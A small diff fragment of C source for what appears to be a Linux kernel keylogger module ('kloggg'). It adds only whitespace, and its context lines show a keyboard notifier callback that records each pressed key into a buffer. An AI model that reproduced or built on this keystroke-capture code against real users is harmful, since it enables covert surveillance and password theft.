@@ -71,9 +71,11 @@ static char kloggg_keycode_to_ascii(unsigned int keycode, int shift_mask) {
 
 static int kloggg_log(struct notifier_block *nb, unsigned long action, void *data) {
   struct keyboard_notifier_param *param = data;
+
   if (action == KBD_KEYCODE && param->down) {
     unsigned int keycode = param->value;
     int shift_mask = param->shift;
+
     char c = kloggg_keycode_to_ascii(keycode, shift_mask);
     if (c > 0 && c < 128) {
       keybuf[keybuf_pos++] = c;
